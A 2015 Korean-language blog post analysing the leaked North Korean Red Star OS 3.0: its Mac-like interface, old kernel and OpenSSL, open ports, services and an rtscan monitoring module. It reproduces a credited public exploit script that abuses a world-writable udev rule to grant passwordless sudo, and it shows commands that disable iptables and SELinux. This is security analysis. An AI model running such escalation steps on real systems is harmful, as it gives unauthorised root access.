---
author: kevinkoo001@gmail.com
comments: false
date: 2015-01-13 08:59:30+00:00
layout: post
link: http://dandylife.net/blog/archives/313
slug: looking-at-redstar-3-0-closely
title: Looking at Redstar 3.0 (붉은별) closely
wordpress_id: 313
categories:
- Attack &amp; Defense, Cyber Warfare
- Miscellaneous Stuff
tags:
- Linux
- North Korea
- Redstar
---

북한의 운영체제라 불리는 붉은별 3.0 (Redstar) Desktop 버전이 지난해 말 익명의 [pastebin](http://pastebin.com/cHAzyTE7)에서 공개되었다. 해외에서는 벌써 신기한 눈으로 이를 뜯어보기 시작했는데, 정작 국내에서는 정보를 찾아보기 힘들어 한 번 살펴봤다.

**I. Overview**

전반적인 모습은 Mac OS X의 외모를 한 Redhat 기반의 Linux다. 개인용으로 배포되어 그런지 외관상 미려해 보이며, 김정일이 Mac을 써 본 후 만족해서 그의 지시하에 Linux기반의 Mac 외관을 갖추게 되었다는 얘기도 있다.  아래는 본인이 configuration을 손수 설정해 본 화면이다.

[![](http://dandylife.net/blog/wp-content/uploads/2015/01/overall.jpg)](http://dandylife.net/blog/wp-content/uploads/2015/01/overall.jpg)

서광사무처리는 오피스에 해당하며 본문문서(워드), 자료표(엑셀), 연시물(파워포인트) 3대 기본 소프트웨어를 모두 갖추고 있다. 이밖에도 계산기는 전자수신기, 브라우저는 내나라열람기, media player는 다매체 재생기라 부르는 아이콘으로 실행할 수 있다. 특히 terminal은 조작락이라고 부르고 있으며, default로 접근할 수 있지 않다. 전체적인 느낌은 상당히 사무용에 한정해 (일부 게임도 있지만) 사용하도록 구성했다는 점이다.

소프트웨어 배포는 Redhat 기반의 Linux에서 사용하는 rpm만 이용하는 것으로 보이며, ubuntu기반의 apt-get은 없다.

Linux Kernel은 상당히 오래된 안정 버전인 2.6.38을 사용 중이며 release 정보 또한 확인할 수 있다.  Forbes에서 Thomas는 전문가의 말을 인용해 보안에 취약한 구버전의 소프트웨어를 사용하고 있으며, 기본적인 실수나 보안을 고려하지 않은 코딩으로 인한 취약점도 여럿 발견되었다고 했다.

    
    [user@localhost ~]$ uname -a
    Linux localhost 2.6.38.8-24.rs3.0.i686 #1 SMP Fri Mar 22 09:35:36 KST 2013 i686 i686 i386 GNU/Linux
    
    [user@localhost ~]$ cat /etc/redstar-release
    《붉은별》사용자용체계 3.0판
    
    [user@localhost ~]$ cat /etc/redhat-release
    《붉은별》사용자용체계 3.0판




**II. Features & Security**

가상환경에서 설치를 마친 직후는 호스트와 상호 ICMP 메시지도 보낼 수 없다. 대부분이 막혀 있는 것으로 보이는데 뒤에서 살펴보도록 하자. 기본으로 열려있는 포트를 확인해 보면 의외로 445번(SMB)을 확인할 수 있는데, 이를 통해 Windows에서 읽기전용으로 root directory 전체와 쓰기 권한이 있는 Public Folder에 접근할 수 있다.

    
    [user@localhost ~]$ netstat -anlp | grep 0.0.0.0
    (Not all processes could be identified, non-owned process info
     will not be shown, you would have to be root to see it all.)
    tcp        0      0 127.0.0.1:631               0.0.0.0:*                   LISTEN      -
    tcp        0      0 0.0.0.0:445                 0.0.0.0:*                   LISTEN      -
    tcp        0      0 0.0.0.0:199                 0.0.0.0:*                   LISTEN      -
    tcp        0      0 0.0.0.0:139                 0.0.0.0:*                   LISTEN      -
    tcp        0      0 0.0.0.0:111                 0.0.0.0:*                   LISTEN      -
    udp        0      0 0.0.0.0:161                 0.0.0.0:*                               -
    udp        0      0 0.0.0.0:162                 0.0.0.0:*                               -
    udp        0      0 127.0.0.1:51111             0.0.0.0:*                               -
    udp        0      0 0.0.0.0:5353                0.0.0.0:*                               -
    udp        0      0 0.0.0.0:49697               0.0.0.0:*                               2583/chkutil_client
    udp        0      0 0.0.0.0:68                  0.0.0.0:*                               -
    udp        0      0 0.0.0.0:864                 0.0.0.0:*                               -
    udp        0      0 0.0.0.0:111                 0.0.0.0:*                               -
    udp        0      0 0.0.0.0:631                 0.0.0.0:*                               -
    udp        0      0 0.0.0.0:36741               0.0.0.0:*                               -
    udp        0      0 192.168.26.131:137          0.0.0.0:*                               -
    udp        0      0 0.0.0.0:137                 0.0.0.0:*                               -
    udp        0      0 192.168.26.131:138          0.0.0.0:*                               -
    udp        0      0 0.0.0.0:138                 0.0.0.0:*                               -


작년에 큰 이슈가 되었던 openssl의 heartbleed 가능여부를 보면, 영향을 받지 않는 버전(0.9.8g)임을 알 수 있다.

    
    [user@localhost ~]$ openssl
    OpenSSL> version
    OpenSSL 0.9.8g 19 Oct 2007


좀 더 나아가 root 권한을 획득해 보자.  richardg867는 그의 블로그에서 Software Manager가 sudo를 통해 root권한으로 동작하는 점을 이용해 root 권한을 획득할 수 있는 rpm을 제공한다. 해당 rpm은 /bin/rootsh을 복사하며, 다음과 같이 setuid 권한을 가지고 있다.

    
    [user@localhost ~]$ ls -la /bin/rootsh
    -rwsr-sr-x. 1 root admin 4978 2014-12-30 20:00 /bin/rootsh


또한 지난 9일 Seclist에서  [local privilege escalation 취약점이 보고(CVE)](http://seclists.org/oss-sec/2015/q1/101)되었다. 모든 이가 쓸 수 있는 권한을 가지도록 잘못 설정되어 이를 이용해 "RUN+" 인자를 추가하고 root 권한으로 실행할 수 있다.

    
    [user@localhost ~]$ ls -la /etc/udev/rules.d/85-hplj10xx.rules
    -rwxrwxrwx. 1 root admin 1598 2012-11-18 02:26 /etc/udev/rules.d/85-hplj10xx.rules


위 취약점을 이용한 코드도 이미 다음과 같이 공개되었다. (Credit: [http://sprunge.us/cIKN?sh](http://sprunge.us/cIKN?sh))

    
    #!/bin/bash -e
    cp /etc/udev/rules.d/85-hplj10xx.rules /tmp/udevhp.bak
    echo 'RUN+="/bin/bash /tmp/r00t.sh"' > /etc/udev/rules.d/85-hplj10xx.rules
    cat <<EOF >/tmp/r00t.sh
    echo -e "ALL\tALL=(ALL)\tNOPASSWD: ALL" >> /etc/sudoers
    mv /tmp/udevhp.bak /etc/udev/rules.d/85-hplj10xx.rules
    chown 0:0 /etc/udev/rules.d/85-hplj10xx.rules
    rm /tmp/r00t.sh
    EOF
    chmod +x /tmp/r00t.sh
    echo "sudo will be available after reboot"
    sleep 2
    reboot


이제 여러가지 정보를 더 확인해 볼 수 있다. root는 /sbin/nologin으로 인해 로그인을 할 수 없도록 되어 있다. /etc/passwd에서 root가 /bin/bash를 이용할 수 있도록 편집하면 root로 로그인할 수 있을 것이다.

    
    [user@localhost ~]$ rootsh
    [root@localhost ~]# cat /etc/passwd | grep 0:0
    root:x:0:0:System Administrator:/root:/sbin/nologin
    
    [root@localhost ~]# cat /etc/shadow | grep root
    root:!!:16435:0:99999:7:::


기본적으로 동작하고 중지된 서비스는 다음과 같다. 예상했던 대로 smbd이 동작하고 있다.

    
    [root@localhost ~]# service --status-all | grep running
    auditd (pid  1664) is running...
    Avahi daemon is running
    /etc/init.d/battery: line 62: exit: 3:: numeric argument required
    capi not installed - No such file or directory (2)
    chkutild (pid 1931) is running...
    cupsd (pid  1683) is running...
    duid (pid 1970) is running...
    hald (pid 1337) is running...
    intcheck (pid  1433) is running...
    dbus-daemon (pid 2077 1331) is running...
    nmbd (pid  1497) is running...
    restorecond (pid  1546) is running...
    rpcbind (pid 1961) is running...
    rpc.idmapd (pid 1584) is running...
    securityd (pid 1601) is running...
    Securityd daemon is running
    smbd (pid  1612) is running...
    snmpd (pid 1626) is running...
    snmptrapd (pid  1636) is running...
    openssh-daemon (pid  9330) is running...
    syslogd (pid  1196) is running...
    klogd (pid  1209) is running...
    
    [root@localhost ~]# service --status-all | grep stopped
    battery_monitor is stopped
    /etc/init.d/battery: line 62: exit: 3:: numeric argument required
    bonjour is stopped
    capi not installed - No such file or directory (2)
    mdmonitor is stopped
    netplugd is stopped
    rpc.mountd is stopped
    nfsd is stopped
    rpc.statd is stopped
    pcscd is stopped
    portreserve is stopped
    rdisc is stopped
    saslauthd is stopped
    snort is stopped
    /etc/init.d/udev-post: line 19: /etc/sysconfig/udev: No such file or directory
    vsftpd is stopped
    winbindd is stopped


처음 설치 후에는 Redhat에서 기본적으로 제공하는 SELinux와  iptables를 이용한 방화벽 때문에 내부에서 외부로 접속하는 일부 포트를 제외하고 ICMP, DNS를 포함한 대부분의 서비스가 모두 막혀 있다.  다음과 같이 이를 제거하면 외부망에 접속할 수 있다.

    
    [root@localhost ~]# mv /etc/sysconfig/iptables /etc/sysconfig/iptables_
    [root@localhost ~]# setenforce 0


마지막으로 로드되어 있는 모듈을 살펴보자.

    
    <strong>[root@localhost ~]# lsmod</strong>
    Module                  Size  Used by
    ipv6                  263586  140
    sunrpc                184428  1
    capi                   11513  0
    capifs                  2645  1 capi
    kernelcapi             30700  1 capi
    rtscan                 15849  4
    snd_ens1371            18029  1
    gameport                8129  1 snd_ens1371
    snd_rawmidi            18344  1 snd_ens1371
    snd_ac97_codec         98095  1 snd_ens1371
    ac97_bus                1086  1 snd_ac97_codec
    snd_seq                49557  0
    snd_seq_device          5697  2 snd_rawmidi,snd_seq
    snd_pcm                71425  2 snd_ens1371,snd_ac97_codec
    snd_timer              17277  2 snd_seq,snd_pcm
    btusb                  13094  0
    ppdev                   6786  0
    bluetooth              84599  1 btusb
    parport_pc             18979  0
    rfkill                 15198  1 bluetooth
    i2c_piix4               9411  0
    vmw_balloon             5489  0
    snd                    53375  9 snd_ens1371,snd_rawmidi,snd_ac97_codec,snd_seq,snd_seq_device,snd_pcm,snd_timer
    pcnet32                26864  0
    i2c_core               23505  1 i2c_piix4
    parport                28041  2 ppdev,parport_pc
    soundcore               5521  1 snd
    mii                     3842  1 pcnet32
    snd_page_alloc          6525  1 snd_pcm
    kdm                   303648  0
    mptspi                 13711  1
    mptscsih               27334  1 mptspi
    mptbase                74966  2 mptspi,mptscsih
    scsi_transport_spi     19608  1 mptspi


특이한 점은 Forbes에서 보도했듯이 rtscan이라는 커널 모듈이다. description을 통해 rt가 real time이라는 사실과 해당 모듈이 모니터링을  용도라는 점, 그리고 작성자와 이메일을 알 수 있다. Forbes는 해당 메일로 문의했다고 하나 현재까지 답변을 받지 못하고 있다고 한다.

    
    [root@localhost ~]# strings /lib/modules/2.6.38.8-24.rs3.0.i686/kernel/fs/rtscan.ko
    license=GPL
    author=Kim Yong Gwang (kyg1024@osd.inf.kp)
    description=Real Time Monitoring Module
    srcversion=4EEA04C71C3B543F76DB130
    depends=
    vermagic=2.6.38.8-24.rs3.0.i686 SMP mod_unload 686
    rtscan




**III. Wrap-up**

북한의 운영체제 하나만을 보고 사이버 전력을 결론짓기엔 물론 무리가 있으나, 유출된 운영체제를 통해 그들의 상황을 짐작할 수는 있다. 오래된 버전의 소프트웨어를 사용하거나 알려진 취약점이 있음에도 배포하는 이유는 모르겠지만, 원활한 감시체계를 위해 의도적으로 만들었을 가능성 또한 배제할 수 없다. 제한된 포트만을 내부에서 외부로 접속할 수 있도록 방화벽이 설정되어 그 외부를 차단해 일반인은 내부망만을 이용하도록 강제되어 있다.  자세한 사항은 알 수 없지만 특정 커널 모듈은 rootkit 형태로 모니터링 용도로 존재한다.



**IV. References**

[http://www.forbes.com/sites/thomasbrewster/2015/01/09/hacking-north-korea-red-star-is-easy/](http://www.forbes.com/sites/thomasbrewster/2015/01/09/hacking-north-korea-red-star-is-easy/)
[http://richardg867.wordpress.com/2015/01/01/notes-on-red-star-os-3-0/](http://richardg867.wordpress.com/2015/01/01/notes-on-red-star-os-3-0/)
[https://stewilliams.com/surprise-norks-linux-disto-has-security-vulns/
http://seclists.org/oss-sec/2015/q1/101
](https://stewilliams.com/surprise-norks-linux-disto-has-security-vulns/)
